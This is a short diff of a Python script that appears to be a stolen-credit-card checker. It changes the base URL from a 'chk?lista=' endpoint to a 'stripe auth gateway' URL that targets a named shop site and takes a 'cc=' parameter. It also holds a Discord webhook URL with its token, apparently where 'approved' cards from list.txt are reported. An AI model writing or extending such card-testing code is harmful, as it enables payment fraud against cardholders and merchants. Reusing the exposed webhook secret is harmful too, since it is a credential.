@@ -4,7 +4,7 @@ import urllib.parse
 import time
 
 INPUT_FILE = "list.txt"
-BASE_URL = "https://zlatan-appsify.onrender.com/chk?lista="
+BASE_URL = "https://titanautostripeauth.onrender.com/gateway=titanautostripe/key=titanfuryy/site=dilaboards.com/cc="
 WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"
 
 approved = []
